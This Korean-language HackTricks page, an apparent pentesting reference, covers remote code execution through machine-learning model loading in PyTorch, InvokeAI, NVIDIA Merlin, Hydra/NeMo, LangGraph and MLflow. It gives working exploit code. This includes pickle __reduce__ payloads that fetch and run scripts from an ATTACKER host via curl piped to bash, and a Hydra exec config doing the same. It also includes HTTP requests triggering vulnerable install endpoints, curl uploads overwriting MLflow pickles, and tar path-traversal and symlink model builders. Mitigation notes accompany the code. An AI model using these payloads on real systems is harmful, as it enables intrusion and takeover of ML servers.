# Models RCE

{{#include ../banners/hacktricks-training.md}}

## 모델 로드로 RCE

Machine Learning 모델은 ONNX, TensorFlow, PyTorch 등 다양한 형식으로 공유됩니다. 개발자 머신이나 프로덕션 시스템에서 사용하기 위해 모델을 로드할 수 있습니다. 일반적으로 모델에 악성 코드가 포함되어서는 안 되지만, 의도된 기능으로서 또는 모델 로딩 라이브러리의 취약점 때문에 모델을 이용해 시스템에서 임의 코드를 실행할 수 있는 경우가 있습니다.

다음 표에는 이 범주에 해당하는 대표적인 취약점이 나와 있습니다.

| **프레임워크 / 도구**        | **취약점 (사용 가능한 경우 CVE)**                                                    | **RCE 벡터**                                                                                                                           | **참고 자료**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | `torch.load`의 *안전하지 않은 역직렬화* **(CVE-2025-32434)**                                                              | 악성 pickle이 모델 checkpoint에 포함되어 코드 실행으로 이어짐 (`weights_only` 보호 기능 우회)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행; 관리 API의 Java 역직렬화 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`를 통한 안전하지 않은 checkpoint 역직렬화 **(CVE-2025-23298)**                                           | 신뢰할 수 없는 checkpoint가 `load_model_trainer_states_from_checkpoint`에서 pickle reducer를 트리거하여 ML worker에서 코드 실행            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 안전하지 않은 MessagePack 확장 hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 사용자가 제어하는 `filter` 키로 SQL/JSON-path 구문을 삽입하고, `UNION SELECT`로 가짜 checkpoint row를 만든 뒤 `msgpack` 역직렬화 과정에서 공격자가 선택한 Python 코드를 import하고 호출 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (안전하지 않은 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델을 로드할 때 `yaml.unsafe_load`를 사용하여 코드 실행 <br> **Lambda** 레이어가 포함된 모델을 로드하면 임의의 Python 코드 실행          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 파싱)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로를 일으켜 heap 손상을 유발 (RCE 가능성)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`로 모델을 로드하면 공격자의 `__reduce__` payload가 포함된 pickle이 실행됨                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (안전하지 않은 `np.load`) *이견 있음*                                                                              | `numpy.load`는 기본적으로 pickle object 배열을 허용했으며, 악성 `.npy/.npz` 파일이 코드 실행을 유발함                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (디렉터리 traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 외부 weights 경로가 디렉터리 바깥을 가리킬 수 있어 임의 파일을 읽을 수 있음 <br> 악성 ONNX 모델 tar가 임의 파일을 덮어써 RCE로 이어질 수 있음 | |
| ONNX Runtime (설계상 위험)  | *(CVE 없음)* ONNX custom ops / control flow                                                                                    | custom operator가 있는 모델은 공격자의 native code를 로드해야 함; 복잡한 모델 그래프가 로직을 악용해 의도하지 않은 계산을 실행할 수 있음   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (경로 traversal)                                                                                          | `--model-control`이 활성화된 상태에서 model-load API를 사용하면 상대 경로 traversal로 파일을 쓸 수 있음 (예: RCE를 위해 `.bashrc` 덮어쓰기)    | |
| **GGML (GGUF 형식)**      | **CVE-2024-25664 … 25668** (다수의 heap overflow)                                                                         | 잘못 구성된 GGUF 모델 파일이 parser에서 heap buffer overflow를 일으켜 피해자 시스템에서 임의 코드 실행이 가능해짐                     | |
| **Keras (이전 형식)**   | *(새 CVE 없음)* Legacy Keras H5 모델                                                                                         | Lambda 레이어가 포함된 악성 HDF5 (`.h5`) 모델은 로드 시 계속 코드를 실행함 (Keras safe_mode는 이전 형식을 다루지 않음 – “downgrade attack”) | |
| **기타** (일반)        | *설계 결함* – Pickle 직렬화                                                                                         | pickle 기반 모델 형식, Python `pickle.load` 등 많은 ML 도구는 완화 조치가 없으면 모델 파일에 포함된 임의 코드를 실행함 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 신뢰할 수 없는 metadata를 `hydra.utils.instantiate()`에 전달 **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 공격자가 제어하는 모델 metadata/config에서 `_target_`을 임의의 callable (예: `builtins.exec`)로 설정하면 “안전한” 형식 (`.safetensors`, `.nemo`, repo `config.json`)에서도 로드 중 실행됨 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

또한 [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용되는 것과 같이 Python pickle을 기반으로 하는 모델 중에는 `weights_only=True`로 로드하지 않을 경우 시스템에서 임의 코드를 실행하는 데 악용될 수 있는 모델이 있습니다. 따라서 pickle 기반 모델은 위 표에 나와 있지 않더라도 이러한 유형의 공격에 특히 취약할 수 있습니다.

### Hydra metadata → RCE (safetensors에서도 동작)

`hydra.utils.instantiate()`는 설정/metadata 객체의 점으로 구분된 `_target_`을 import하고 호출합니다. Hugging Face Transformers 같은 라이브러리가 **신뢰할 수 없는 모델 metadata**를 `instantiate()`에 전달하면, 공격자가 callable과 인수를 제공해 모델 로드 중 즉시 실행되도록 할 수 있습니다 (pickle 불필요).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload 예시 (`.nemo` `model_config.yaml`, repo `config.json` 또는 `.safetensors` 내부 `__metadata__`에서 동작):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

주요 사항:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, FlexTok loaders에서 모델 초기화 전에 트리거됩니다.
- Hydra의 문자열 block-list는 대체 import 경로(예: `enum.bltns.eval`) 또는 애플리케이션에서 해석한 이름(예: `nemo.core.classes.common.os.system` → `posix`)을 사용해 우회할 수 있습니다.<sup>[[14]](#references)</sup>
- FlexTok은 `ast.literal_eval`로 문자열화된 메타데이터도 파싱하므로 Hydra 호출 전에 DoS(CPU/메모리 고갈)가 발생할 수 있습니다.

### 🆕  `torch.load`를 통한 InvokeAI RCE (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion용으로 널리 사용되는 오픈 소스 웹 인터페이스입니다. **5.3.1 – 5.4.2** 버전에는 사용자가 임의의 URL에서 모델을 다운로드하고 로드할 수 있는 REST endpoint `/api/v2/models/install`이 노출되어 있습니다.<sup>[[1]](#references)</sup>

내부적으로 이 endpoint는 최종적으로 다음을 호출합니다:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

제공된 파일이 **PyTorch checkpoint (`*.ckpt`)**이면 `torch.load`가 **pickle 역직렬화**를 수행합니다. 콘텐츠가 사용자 제어 URL에서 직접 제공되므로 공격자는 checkpoint 안에 사용자 지정 `__reduce__` 메서드가 있는 악성 객체를 넣을 수 있습니다. 이 메서드는 **역직렬화 중 실행되어** InvokeAI 서버에서 **원격 코드 실행(RCE)**을 유발합니다.

이 취약점에는 **CVE-2024-12029**(CVSS 9.8, EPSS 61.17 %)가 부여되었습니다.

#### Exploitation 진행 과정

1. 악성 checkpoint 생성:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. 제어하는 HTTP 서버에 `payload.ckpt`를 호스팅합니다(예: `http://ATTACKER/payload.ckpt`).
3. 취약한 엔드포인트를 트리거합니다(인증 불필요):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스의 권한으로 코드를 실행할 수 있습니다.

기성 exploit: **Metasploit** 모듈 `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 과정을 자동화합니다.<sup>[[3]](#references)</sup>

#### 조건

•  InvokeAI 5.3.1-5.4.2 (scan 플래그 기본값은 **false**)
•  공격자가 `/api/v2/models/install`에 접근할 수 있음
•  프로세스에 셸 명령을 실행할 권한이 있음

#### 완화 조치

* **InvokeAI ≥ 5.4.3**으로 업그레이드하세요. 패치는 기본적으로 `scan=True`를 설정하고 역직렬화 전에 악성코드 검사를 수행합니다.<sup>[[2]](#references)</sup>
* checkpoint를 프로그래밍 방식으로 로드할 때는 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper를 사용하세요.
* 모델 소스에 allow-list / 서명 검증을 적용하고 최소 권한으로 서비스를 실행하세요.

> ⚠️ 신뢰할 수 없는 소스의 Python pickle 기반 형식(다수의 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 **모두** 본질적으로 역직렬화하기에 안전하지 않다는 점을 기억하세요.

---

구버전 InvokeAI를 reverse proxy 뒤에서 계속 실행해야 할 경우 사용할 수 있는 임시 완화 방법의 예:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)는 사용자 제공 경로에서 `torch.load()`를 직접 호출하는 안전하지 않은 checkpoint 로더를 노출했습니다. `torch.load`는 Python `pickle`에 의존하므로, 공격자가 제어하는 checkpoint는 역직렬화 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

취약한 경로(수정 전): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

RCE로 이어지는 이유: Python pickle에서 객체는 callable과 인수를 반환하는 reducer(`__reduce__`/`__setstate__`)를 정의할 수 있습니다. 이 callable은 unpickling 중에 실행됩니다. 이런 객체가 checkpoint에 있으면 가중치를 사용하기 전에 코드가 실행됩니다.

최소한의 악성 checkpoint 예시:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

전달 경로와 영향 범위:
- 저장소, 버킷 또는 아티팩트 레지스트리를 통해 공유되는 트로이 목마화된 체크포인트/모델
- 체크포인트를 자동으로 로드하는 자동화된 재개/배포 파이프라인
- 학습/추론 워커 내부에서 실행되며, 종종 높은 권한으로 실행됨(예: 컨테이너의 root)

수정: 커밋 [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)(PR #802)에서는 직접적인 `torch.load()` 호출을 `transformers4rec/utils/serialization.py`에 구현된 제한적 allow-list 역직렬화기로 대체했습니다. 새 로더는 타입/필드를 검증하고 로드 중 임의의 callable이 호출되지 않도록 합니다.<sup>[[7]](#references)</sup>

PyTorch 체크포인트에 대한 구체적인 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마세요. 가능하면 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX와 같이 실행 코드가 포함되지 않는 형식을 우선 사용하세요.
- PyTorch 직렬화를 반드시 사용해야 한다면 `weights_only=True`(최신 PyTorch에서 지원)를 사용하거나 Transformers4Rec 패치와 유사한 사용자 지정 allow-list unpickler를 사용하세요.<sup>[[4]](#references)</sup>
- 모델 출처/서명을 검증하고 역직렬화를 샌드박스 처리하세요(seccomp/AppArmor, non-root 사용자, 파일 시스템 제한, 네트워크 송신 차단).
- 체크포인트 로드 시 ML 서비스에서 예상치 못한 자식 프로세스가 생성되는지 모니터링하고, `torch.load()`/`pickle` 사용을 추적하세요.

POC 및 취약점/패치 참조:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- 패치 전 취약한 로더: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 악성 체크포인트 POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- 패치 후 로더: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 예시 – 악성 PyTorch 모델 제작

- 모델 생성:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- 모델 로드:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자가 제어하는 데이터를 역직렬화하는 `resnet` 엔드포인트를 노출합니다. ZDI는 원격 공격자가 피해자가 악성 페이지/파일을 로드하도록 유도하고, 해당 페이지/파일이 조작된 직렬화 blob을 엔드포인트로 전송하게 해 `root` 권한으로 역직렬화를 트리거하여 시스템을 완전히 장악할 수 있음을 확인했습니다.

이 exploit 흐름은 일반적인 pickle 악용 방식과 유사합니다:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

역직렬화 중 접근 가능한 모든 gadget(생성자, `__setstate__`, 프레임워크 콜백 등)은 전송 방식이 HTTP, WebSocket, 또는 감시 중인 디렉터리에 넣은 파일인지와 관계없이 같은 방식으로 weaponize할 수 있습니다.



### LangGraph checkpointer SQLi → MessagePack RCE

이 공격 체인이 흥미로운 이유는 공격자가 **악성 model 파일을 업로드할 필요가 없기 때문입니다**. 대신 애플리케이션이 **AI-agent persistence API**(`get_state_history(..., filter=...)`)를 노출하고, 사용자 입력이 checkpointer 쿼리 빌더에 전달됩니다.

#### 1. metadata 필터의 구조적 SQLi

취약한 SQLite 패턴은 다음과 같습니다:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

값은 나중에 바인딩되지만, `query_key`는 **JSON path 문자열**에 연결되므로 사전 키 안의 `'`가 `'$.{query_key}'`를 벗어나 SQL을 주입합니다. 같은 교훈은 **JSON paths, identifiers, operators, `LIMIT`, TTL fields**에도 적용됩니다. placeholder는 값만 보호할 뿐, 쿼리 구문 구조는 보호하지 않습니다.

#### 2. `UNION SELECT`는 데이터 탈취뿐 아니라 다운스트림 sink도 노릴 수 있습니다

쿼리는 `type`과 직렬화된 `checkpoint` 바이트를 반환하며, 이 값은 나중에 다음과 같이 사용됩니다:

```python
self.serde.loads_typed((type, checkpoint))
```

이는 `WHERE` 절의 SQLi를 통해 **가짜 결과 행**을 삽입할 수 있다는 뜻입니다:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

나중에 코드가 선택된 열을 파싱, 역직렬화, 기록 또는 실행한다면 해당 열을 싱크에 연결하세요. 이 경우 가짜 행으로 인해 SQLi가 **공격자 제어 역직렬화**로 이어집니다.

#### 3. 안전하지 않은 MessagePack extension hook은 code gadget과 동등합니다

LangGraph의 `msgpack` 경로는 중첩된 튜플을 unpack한 뒤 다음을 실행하는 custom extension hook을 사용했습니다:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

따라서 `("os", "system", "id > /tmp/pwned")`와 동등한 내용을 인코딩한 MessagePack extension object는 `os`를 import하고, `system`을 찾아 명령을 실행합니다. AI 프레임워크를 검토할 때는 dynamic import, reflection 또는 임의의 callable dispatch를 수행하는 **custom MessagePack/JSON/pickle revivers**를 살펴보세요.

#### 4. Agent 프레임워크의 실용적인 감사 패턴

사용자가 제어하는 입력이 다음 항목에 전달되는지 검토하세요.
- state history / memory / replay / checkpoint listing API
- SQL 또는 Redis query fragment를 생성하는 구조화된 filter builder
- custom deserializer (`pickle`, `msgpack`, `json` object hook, YAML constructor)
- persistence layer에서 반환된 row를 신뢰하는 복구 경로

이 특정 chain은 신뢰할 수 없는 사용자가 `filter`를 제어할 수 있는 self-hosted LangGraph 배포의 **SQLite** 또는 **Redis** checkpointer에 영향을 미쳤습니다. 공개된 내용에 따르면 패치된 버전은 `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`입니다.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact 덮어쓰기를 통한 pickle RCE

`PythonModel`에서 만든 MLflow PyFunc는 직렬화된 객체를 `python_model.pkl`로 저장할 수 있습니다. 모델 metadata는 `mlflow.pyfunc.model`을 loader로 지정하며, MLflow 구현은 저장된 Python model에 이 파일명을 사용합니다. 따라서 artifact store에 대한 쓰기 권한은 이후 해당 모델을 로드하는 다른 애플리케이션에서 코드 실행으로 이어질 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

유용한 chain은 **artifact 쓰기 권한 → pickle 교체 → inference consumer가 다시 로드하도록 유도**하는 것입니다. proxied `mlflow-artifacts:/...` root를 사용하는 experiment의 경우, experiment, run, model artifact path를 열거하세요. Tracking server는 `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`에서 `GET` 및 `PUT`을 제공합니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

최소 reducer는 consumer가 artifact를 unpickle하는 즉시 명령을 실행할 수 있습니다. `MLmodel`에 선언된 Python 버전으로 payload를 생성하면 호환성 문제를 피할 수 있습니다.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

기존 모델을 **로드**하는 작업을 트리거합니다. 예를 들어 prediction, scoring 또는 deployment가 있습니다. 먼저 재학습하지 마세요. 학습 과정에서 악성 artifact가 새로운 모델로 교체될 수 있습니다. 애플리케이션 오류가 발생했다고 해서 exploit이 실패한 것은 아닙니다. reducer는 사용할 수 있는 모델 대신 명령의 정수 종료 상태를 반환합니다. 먼저 ICMP 또는 HTTP callback처럼 관찰 가능한 부작용을 확인한 다음, 최종 payload로 교체합니다.<sup>[[20]](#references)</sup>

평가 중에는 run을 생성할 권한과 다른 run에 속한 artifact를 덮어쓸 권한을 구분해야 합니다. 인증 및 run별 업데이트 권한을 검토하고, 예상치 못한 `python_model.pkl` 수정 여부를 확인하며, 모델 출처와 무결성도 실행 경계의 일부로 취급해야 합니다. 현재 MLflow 코드는 `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` 설정도 지원하며, cloudpickle 데이터를 로드하는 대신 models-from-code artifact를 사용할 것을 권장합니다.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## 모델에서 Path Traversal로

[**이 블로그 게시물**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)에서 언급했듯이, 다양한 AI 프레임워크에서 사용하는 대부분의 모델 형식은 보통 `.zip` 같은 archive를 기반으로 합니다. 따라서 이러한 형식을 악용해 path traversal 공격을 수행하고, 모델이 로드되는 시스템에서 임의의 파일을 읽을 수 있습니다.<sup>[[16]](#references)</sup>

예를 들어, 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리에 파일을 생성하는 모델을 만들 수 있습니다:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

또는 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리를 가리키는 symlink를 생성하는 모델을 만들 수 있습니다:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 심층 분석: Keras .keras 역직렬화 및 gadget 탐색

.keras 내부 구조, Lambda-layer RCE, ≤ 3.8의 임의 import 문제, 수정 후 allowlist 내부 gadget 탐색에 대한 집중 가이드는 다음을 참조하세요:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec 블로그 – "CVE-2024-12029 – InvokeAI의 신뢰할 수 없는 데이터 역직렬화"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI 패치 커밋 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit 모듈 문서](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load 보안 고려 사항](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI 블로그 – CVE-2025-23298: NVIDIA Merlin에서 원격 코드 실행 달성](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI 권고문: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec 패치 커밋 b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [패치 전 취약한 로더 (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [악성 체크포인트 PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [패치 후 로더 (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 최신 AI/ML 형식 및 라이브러리를 이용한 원격 코드 실행](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 문서](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra 차단 목록 커밋 (RCE 경고)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi에서 RCE까지: LangGraph의 Checkpointer 악용](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip 버그를 고가치 AI/ML 바운티로 연결하기](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk 권고문 및 PyFunc 개념 증명 – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow 소스 – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – 아티팩트 다운로드 및 업로드 엔드포인트](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
